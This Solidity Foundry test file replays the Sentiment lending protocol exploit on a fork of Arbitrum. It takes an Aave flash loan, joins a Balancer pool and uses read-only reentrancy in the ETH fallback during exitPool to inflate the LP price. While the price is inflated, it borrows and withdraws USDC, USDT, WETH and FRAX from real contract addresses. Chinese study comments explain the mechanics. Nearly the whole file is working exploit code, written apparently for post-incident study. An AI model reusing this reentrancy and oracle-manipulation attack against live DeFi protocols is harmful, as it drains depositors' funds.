// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/console.sol";
import "forge-std/Test.sol";
import "../interface.sol";
import "src/defisec/Log.sol";
/*
https://explorer.phalcon.xyz/tx/arbitrum/0xa9ff2b587e2741575daf893864710a5cbb44bb64ccdc487a100fa20741e0f74d
https://vscode.blockscan.com/arbitrum-one/0xba12222222228d8ba445958a75a0704d566bf2c8
*/
interface AaveV3Pool {
    function flashLoan(address receiverAddress, address[] memory assets, uint[] memory amounts, uint[] memory interestRateModes,
        address onBehalfOf, bytes memory params, uint16 referralCode) external;

}
interface AccountManager {
    function openAccount(address d) external returns (address);
    function deposit(address account, address token, uint amt) external;
    function approve(address collector, address token, address recipient, uint amount) external;
    function exec(address account, address target, uint amt, bytes memory data) external;
    function borrow(address account, address token, uint amt) external;
    function riskEngine() external view returns (address);
}
interface Account {
    function getAssets() external view returns (address[] memory);
    function getBorrows() external view returns (address[] memory);
}
interface Oracle{
    function getPrice(address token) external view returns (uint256);
}
interface IRiskEngine{
    function isAccountHealthy(address account) external view returns (bool);
    function getBalance(address account) external view returns (uint);
    function getBorrows(address account) external view returns (uint);
    function oracle() external view returns (address);
}
interface BalancerVault{
    function joinPool(bytes32 poolId, address sender, address recipient,JoinPoolRequest memory request) payable external;
    function exitPool(bytes32 poolId, address sender, address payable recipient, ExitPoolRequest memory request) external;
    struct JoinPoolRequest {
        address[] assets;
        uint256[] maxAmountsIn;
        bytes userData;
        bool fromInternalBalance;
    }
    struct ExitPoolRequest {
        address[] assets;
        uint256[] minAmountsOut;
        bytes userData;
        bool toInternalBalance;
    }
    function getPoolTokens(bytes32 poolId) external view returns(address[] memory poolTokens, uint256[] memory balances, uint256 lastChangeBlock);
}

interface IPool{
    function approve(address spender, uint256 amount) external returns (bool);
    function getNormalizedWeights() external view returns (uint256[] memory);
    function getPoolId(address token) external view returns (bytes32);
    function totalSupply() external view returns (uint256);
//    function onExitPool();
}
interface IWeightedBalancerLPOracle {
    function getPrice(address token) external view returns (uint256);
}
// forge test --contracts ./src/defisec/lending/Sentiment_exp.sol -vv  (vv只打印log不打印trace)
contract ContractTest is Test, MyLog{
    AaveV3Pool aaveV3Pool = AaveV3Pool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    AccountManager accountManager = AccountManager(0x62c5AA8277E49B3EAd43dC67453ec91DC6826403);
    BalancerVault balanceVault = BalancerVault(payable(0xBA12222222228d8Ba445958a75a0704d566BF2C8));
    IWeightedBalancerLPOracle weightedBalancerLPOracle = IWeightedBalancerLPOracle(0x16F3ae9C1727ee38c98417cA08BA785BB7641b5B);
    IRiskEngine riskEngine;
    Account account;
    Oracle oracle;

    IERC20 balancerPoolToken = IERC20(0x64541216bAFFFEec8ea535BB71Fbc927831d0595);
    IERC20  WBTC= IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
    IWETH WETH = IWETH(payable(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1));
    IERC20 USDC_e = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IERC20 USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
    IERC20 FRAX = IERC20(0x17FC002b466eEc40DaE837Fc4bE5c67993ddBd6F);

    IERC20 LUSDC = IERC20(0x0dDB1eA478F8eF0E22C7706D2903a41E94B1299B);
    IERC20 LUSDT = IERC20(0x4c8e1656E042A206EEf7e8fcff99BaC667E4623e);
    IWETH LETH = IWETH(payable(0xb190214D5EbAc7755899F2D96E519aa7a5776bEC));
    IERC20 LFRAX = IERC20(0x2E9963ae673A885b6bfeDa2f80132CE28b784C40);


    address CurvePool_FRAXBP = 0xC9B8a3FDECB9D5b218d02555a8Baf332E5B740d5;

    using FixedPointMathLib for uint256;

    function setUp() public {
        vm.createSelectFork('arbitrum', 77026913 - 1);
        finalInterest('setUp');
        vm.deal(address(this), 0);//不知道为什么，初始化的eth特别多。这里清零，否则后面的数据对不上。
    }

    function testExploit() public {
        address[] memory assets = new address[](3);
        assets[0] = address(WBTC);
        assets[1] = address(WETH);
        assets[2] = address(USDC_e);
        uint[] memory amounts = new uint[](3);
        amounts[0] = 606e8;
//        amounts[1] = 10050e18;
        amounts[1] = 10_050.1e18;
        amounts[2] = 18_000_000e6;
        uint[] memory interestRateModes = new uint[](3);
        interestRateModes[0]=0;
        interestRateModes[1]=0;
        interestRateModes[2]=0;
        bytes memory params = new bytes(0);
        console.log('before flashloan');
        aaveV3Pool.flashLoan(address(this), assets, amounts, interestRateModes,address(this), abi.encode(''), 0);
        finalInterest('after flashloan');
    }
    int count = 0;
    function executeOperation(address[] memory assets, uint[] memory amounts, uint[] memory premiums,
        address initiator, bytes memory params) external returns(bool){

        WETH.withdraw(0.1e18);//fallback报错，这就里就进入fallback

        accountManagerExecJoinPool();
        //joinPool=deposit=addLiquidity,

        joinPool();


        balancerPoolToken.approve(address(balanceVault), 0);//取消授权


        exitPool();

        WETH.approve(address(aaveV3Pool), amounts[1]+premiums[1]);
        USDC_e.approve(address(aaveV3Pool), amounts[2]+premiums[2]);
        WBTC.approve(address(aaveV3Pool), amounts[0]+premiums[0]);

        return true;
    }


    address accountAddress;
    function accountManagerExecJoinPool() internal{
        accountAddress = accountManager.openAccount(address(this));
        riskEngine = IRiskEngine(accountManager.riskEngine());
        account = Account(accountAddress);
        oracle = Oracle(riskEngine.oracle());

        WETH.approve(address(accountManager), 50e18);

        accountManager.deposit(accountAddress, address(WETH), 50e18);

        accountManager.approve(accountAddress, address(WETH), address(balanceVault), 50e18);

        bytes32 poolId = 0x64541216bafffeec8ea535bb71fbc927831d0595000100000000000000000002;
        address sender = accountAddress;
        address recipient = accountAddress;
        address[] memory assets = new address[](3);
        assets[0] = address(WBTC);
        assets[1] = address(WETH);
        assets[2] = address(USDC_e);

        uint[] memory maxAmountsIn = new uint[](3);
        maxAmountsIn[0]=0;
        maxAmountsIn[1]=50e18;
        maxAmountsIn[2]=0;
        bytes memory userData = abi.encode(uint8(1), maxAmountsIn, 0);
        BalancerVault.JoinPoolRequest memory request = BalancerVault.JoinPoolRequest({
            assets:assets,
            maxAmountsIn:maxAmountsIn,
            userData:userData,
            fromInternalBalance:false
        });

        bytes memory data = abi.encodeWithSelector(balanceVault.joinPool.selector, poolId, sender, recipient, request);

        accountManager.exec(accountAddress, address(balanceVault), 0, data);//token-amount-min,extractIn,extractOutLP

    }

    function joinPool() internal{
        WBTC.approve(address(balanceVault), 606e8);
        WETH.approve(address(balanceVault), 10_000e18);
        USDC_e.approve(address(balanceVault), 18_000_000e6);


        bytes32 poolId = 0x64541216bafffeec8ea535bb71fbc927831d0595000100000000000000000002;
        address sender = address(this);//
        address recipient = address(this);
        address[] memory assets = new address[](3);
        assets[0] = address(WBTC);
        assets[1] = address(WETH);
        assets[2] = address(USDC_e);
        uint[] memory maxAmountsIn = new uint[](3);
        maxAmountsIn[0] = 606e8;
        maxAmountsIn[1] = 10_000e18;
        maxAmountsIn[2] = 18_000_000e6;

        bytes memory userData = abi.encode(uint8(1), maxAmountsIn, 0);
        BalancerVault.JoinPoolRequest memory request = BalancerVault.JoinPoolRequest({
            assets:assets,
            maxAmountsIn:maxAmountsIn,
            userData:userData,
            fromInternalBalance:false
        });
        balanceVault.joinPool{value:0.1e18}(poolId, sender, recipient, request);
        logHealth('after joinPool2 ');
    }
/*
    WBTC-ETH-USDC,按照这个顺序，ETH触发fallback， 这时账上还有USDC和LPToken.
*/
    function exitPool() internal{
        /*
            data的构造是个难题。cast 4byte-decode 0x 通过accountManager调用joinPool再自己直接调用，为什么？我猜是为了操纵价格。
        */
        bytes32 poolId = 0x64541216bafffeec8ea535bb71fbc927831d0595000100000000000000000002;
        address sender = address(this);//
        address recipient = address(this);
        address[] memory assets = new address[](3);
        assets[0] = address(WBTC);
        assets[1] = address(0);//不一样
        assets[2] = address(USDC_e);
        uint[] memory minAmountsOut = new uint[](3);
        minAmountsOut[0] = 606e8;
        minAmountsOut[1] = 5_000e18;//一半
        minAmountsOut[2] = 9_000_000e6;//这里的一半，只是滑点的要求写的最小值而已，不是真的只交易要一半，实际上是全部。因为balancer扣手续费，所以写全部就报错饿了。
        minAmountsOut[1] = 10_000e18;
        minAmountsOut[2] = 17_000_000e6;


        uint tokenOut =130600980307287410183876;//第二次join的LP数量。 1表示精确制定LP数量
        bytes memory userData = abi.encode(uint8(1), tokenOut);//这里的值是怎么来的？
        BalancerVault.ExitPoolRequest memory request = BalancerVault.ExitPoolRequest({
            assets:assets,
            minAmountsOut:minAmountsOut,
            userData:userData,
            toInternalBalance:false
        });
        try balanceVault.exitPool(poolId, sender, payable(recipient), request) {

        } catch Error(string memory exception){
            console.log('11111111111111111111              ', exception);
        }
//        balanceVault.exitPool(poolId, sender, payable(recipient), request);
        //这里有遗漏
        WETH.deposit{value: address(this).balance}();
        logHealth('after exitPool 606e8  10_000e18 18_000_000e6 ');
    }

    fallback() external payable {
        console.log("fallback");
        emit log_named_decimal_uint("fallback eth" , msg.value, 18);
        if(count > 1){
            accountManagerBorrow();
        }
        count++;
    }


    function accountManagerBorrow() public{
//

        logHealth('enter borrow function',true);
        logLToken('before borrow');

        accountManager.borrow(address(accountAddress), address(USDC_e), 461_000 * 1e6);//Lending借贷协议，一定要点borrow方法，去看health函数的计算。
        logHealth('after borrow1 usdc 461_000 * 1e6');
        accountManager.borrow(address(accountAddress), address(USDT), 361_000 * 1e6);
        logHealth('after borrow2 usdt 361_000 * 1e6');
        accountManager.borrow(address(accountAddress), address(WETH), 81e18);
        logHealth('after borrow3 weth 81e18');
        accountManager.borrow(address(accountAddress), address(FRAX), 125_000 * 1e18);
        logHealth('after borrow4 frax 125_000 * 1e18');

        logLToken('after borrow');

        accountManager.approve(address(accountAddress),address(FRAX), CurvePool_FRAXBP, type(uint).max);
        accountManager.exec(address(accountAddress), CurvePool_FRAXBP, 0, abi.encodeWithSignature("exchange(int128,int128,uint256,uint256)", 0, 1, 120_000 * 1e18, 1));//exchange 稳定币
        logHealth('after curve.exchange()');
        accountManager.approve(address(accountAddress),address(USDC_e), address(aaveV3Pool), type(uint).max);
        accountManager.approve(address(accountAddress),address(USDT), address(aaveV3Pool), type(uint).max);
        accountManager.approve(address(accountAddress),address(WETH), address(aaveV3Pool), type(uint).max);
        //supply=deposit, 让account向aaveV3Pool存钱， 让account通过aaveV3Pool取钱，取出来的钱给了address(this)???怎么就允许直接给address(this).我我猜操作有个前提，就是health的。
        //没错，exec的最后一个逻辑，就是检查健康度。 只能说之前的健康度太高了。价格应该就是重入转账了，但是还没更新造成的。 从borrow到withdraw，从2.x一直到1.3。 balance怎么算的，还是要知道打印出来。
        //health的公式的组成都打印出来了，思路就还原了。
        accountManager.exec(address(accountAddress), address(aaveV3Pool), 0, abi.encodeWithSignature("supply(address,uint256,address,uint16)", address(USDC_e), 580_000 * 1e6, address(accountAddress), 0));
        logHealth('after exec supply1 usdc 580_000 * 1e6');
        accountManager.exec(address(accountAddress), address(aaveV3Pool), 0, abi.encodeWithSignature("supply(address,uint256,address,uint16)", address(USDT), 360_000 * 1e6, address(accountAddress), 0));
        logHealth('after exec supply2 usdt 360_000 * 1e6');
        accountManager.exec(address(accountAddress), address(aaveV3Pool), 0, abi.encodeWithSignature("supply(address,uint256,address,uint16)", address(WETH), 80 * 1e18, address(accountAddress), 0));
        logHealth('after exec supply3 weth 80 * 1e18');
        accountManager.exec(address(accountAddress), address(aaveV3Pool), 0, abi.encodeWithSignature("withdraw(address,uint256,address)", address(USDC_e), type(uint).max, address(this)));
        logHealth('after exec withdraw1 usdc');
        accountManager.exec(address(accountAddress), address(aaveV3Pool), 0, abi.encodeWithSignature("withdraw(address,uint256,address)", address(USDT), type(uint).max, address(this)));
        logHealth('after exec withdraw2 usdt');
        accountManager.exec(address(accountAddress), address(aaveV3Pool), 0, abi.encodeWithSignature("withdraw(address,uint256,address)", address(WETH), type(uint).max, address(this)));
        logHealth('after exec withdraw3 weth');

    }

    function logHealth(string memory desc) public{
        logHealth(desc,false);
    }
    function logHealth(string memory desc, bool isDetail) public {
        console.log('');
        console.log(desc);
        console.log("isAccountHealthy", riskEngine.isAccountHealthy(address(accountAddress)));
        console.log("getAssets", account.getAssets().length);
        console.log("getBorrows", account.getBorrows().length);
        emit log_named_decimal_uint("LP.price" , oracle.getPrice(address(balancerPoolToken)), balancerPoolToken.decimals());
        emit log_named_decimal_uint("LP.price2" , getPrice(address(balancerPoolToken), isDetail), balancerPoolToken.decimals());
        emit log_named_decimal_uint("getMyBalance" , riskEngine.getBalance(address(accountAddress)), balancerPoolToken.decimals());
        emit log_named_decimal_uint("getMyBorrows" , riskEngine.getBorrows(address(accountAddress)), balancerPoolToken.decimals());
        if(riskEngine.getBorrows(address(accountAddress)) > 0){
            emit log_named_decimal_uint("isAccountHealthy " , riskEngine.getBalance(address(accountAddress)).divWadDown(riskEngine.getBorrows(address(accountAddress))) , 0);
        }
        finalInterest('');
    }

    function logLToken(string memory desc) public {
        console.log('');
        console.log(desc);
        emit log_named_decimal_uint("LUSDC" , USDC_e.balanceOf(address(LUSDC)), USDC_e.decimals());
        emit log_named_decimal_uint("LUSDT" , USDT.balanceOf(address(LUSDT)), USDT.decimals());
        emit log_named_decimal_uint("LFRAX" , FRAX.balanceOf(address(LFRAX)), FRAX.decimals());
        emit log_named_decimal_uint("LETH" , WETH.balanceOf(address(LETH)), WETH.decimals());
        console.log('');
    }

    function finalInterest(string memory desc) public {
        console.log(desc);
        emit log_named_decimal_uint("mybalance WBTC" , WBTC.balanceOf(address(this)), WBTC.decimals());
        emit log_named_decimal_uint("mybalance WETH" , WETH.balanceOf(address(this)), WETH.decimals());
        emit log_named_decimal_uint("mybalance ETH" , address(this).balance, 18);
        emit log_named_decimal_uint("mybalance USDC_e" , USDC_e.balanceOf(address(this)), USDC_e.decimals());
        emit log_named_decimal_uint("mybalance LPToken(33)" , balancerPoolToken.balanceOf(address(this)), balancerPoolToken.decimals());
        console.log('');
        emit log_named_decimal_uint("account balance WBTC" , WBTC.balanceOf(accountAddress), WBTC.decimals());
        emit log_named_decimal_uint("account balance WETH" , WETH.balanceOf(accountAddress), WETH.decimals());
        emit log_named_decimal_uint("account balance ETH" , address(accountAddress).balance, 18);
        emit log_named_decimal_uint("account balance USDC_e" , USDC_e.balanceOf(accountAddress), USDC_e.decimals());
        emit log_named_decimal_uint("account balance LPToken(33)" , balancerPoolToken.balanceOf(accountAddress), balancerPoolToken.decimals());
        console.log('');
    }
// view函数无法调用emit打印方法。
    /*
        Balancer的源码不打印出来，逻辑想不明白，特意把LP的价格函数拿出了调试。

        Balancer的addPool多少balance的变化，swap也是balance的变化。
        但是LP给别人了，需要给外人一个定价，才提供了getPrice,基础可以看所有的token。

				15081850225829783986 price
				  333333333333333333 weight
				45245550677489352003 price.divDown(weights[i])
				 3563351184057446269 price.divDown(weights[i]).powDown(weights[i])
				3.563351184057446269 tmp

				 1000000000000000000
				  333333333333333334
				 2999999999999999994
				 1442249570307393957
				5.139241714061195357

				     534949394156372
				  333333333333333333
				    1604848182469116
				  117078725171186149
				0.601695868228866322

				  计算是为了求平均数的，
				    乘法后一定要除以e18的。（temp*temp）
				    除法后一定要乘以e18的。
                    次方：算法很复杂，看结果也达到了1e18了。

                    15eth，2个，1eth，10个，0.005eth，100个.
                    因为 15*2 + 1*10 + 0.005*100,
                    1*10说说10个，其实10e18个吧， 100个却是100e6，怎么办，拉平到同一个尺度。 /e^decimal * e18

				         decimals  8
				          4011511349
				40.115113490000000000
				 3.423229439596916886
				 3.423229439596916886

				 		decimals  18
			  661.401511480273961696
			  661.401511480273961696
				8.712746153555390870
			   29.825729132585613845

				         decimals  6
				       1187772838596
		  1187772.838596000000000000
			  105.903699133813141788
			 3158.655044503952461720

			 8633.653333415749358167(totalSupply)
                0.220132731306501952(price)

    */
    function getPrice(address token, bool isDetail) public  returns (uint) {
        (address[] memory poolTokens,uint256[] memory balances, uint256 lastChangeBlock) = balanceVault.getPoolTokens(0x64541216bafffeec8ea535bb71fbc927831d0595000100000000000000000002);

        uint256[] memory weights = IPool(token).getNormalizedWeights();
        uint totalSupply = IPool(token).totalSupply();
//        log一打，把多轮数据一比较全明白了。之前不对就是因为看的totalSupply看错了。数据太多，看懵了。必须拿出来做表格。
        //而且不熟练，如果发现totalSuuply没增加，应该理解反应过来不对。第一反应就应该是totalSupply变没变。
        if(isDetail){
            for(uint i; i < poolTokens.length; i++) {
//                console.log('poolTokens ', poolTokens[i]);
//                console.log('balances ', balances[i]);
//                console.log('weights ', weights[i]);
            }
            emit log_named_decimal_uint("totalSupply" , totalSupply, 0);
        }

        uint length = weights.length;
        uint temp = 1e18;
        uint invariant = 1e18;
        for(uint i; i < length; i++) {
            console.log('');
            uint price = Oracle(0x08F81E1637230d25b4ea6d4a69D74373E433Efb3).getPrice(poolTokens[i]);
//            console.log('poolTokens ', poolTokens[i]);
//            console.log('decimals ', IERC20(poolTokens[i]).decimals());
//            console.log('balances ', balances[i]);
//            console.log('(balances[i] * 10 ** (18 - IERC20(poolTokens[i]).decimals())) ', (balances[i] * 10 ** (18 - IERC20(poolTokens[i]).decimals())));
//            console.log('(balances[i] * 10 ** (18 - IERC20(poolTokens[i]).decimals())).powDown(weights[i]) ', (balances[i] * 10 ** (18 - IERC20(poolTokens[i]).decimals())).powDown(weights[i]));
//            console.log('weights ', weights[i]);
//            console.log('price ', price);
//            console.log('price.divDown(weights[i] ', price.divDown(weights[i]));
//            console.log('price.divDown(weights[i]).powDown(weights[i]) ', price.divDown(weights[i]).powDown(weights[i]));

            temp = temp.mulDown(price.divDown(weights[i]).powDown(weights[i]));
            console.log('temp ', temp);
            invariant = invariant.mulDown(
                (balances[i] * 10 ** (18 - IERC20(poolTokens[i]).decimals()))
                .powDown(weights[i])
            );
            console.log('invariant ', invariant);
        }
        emit log_named_decimal_uint("totalSupply" , totalSupply, 0);
        // invariant是余额的平均数， temp是价格的平均数。 底层资产余额*底层资产价格/总供应量。
        return invariant
        .mulDown(temp)
        .divDown(totalSupply);
    }

}

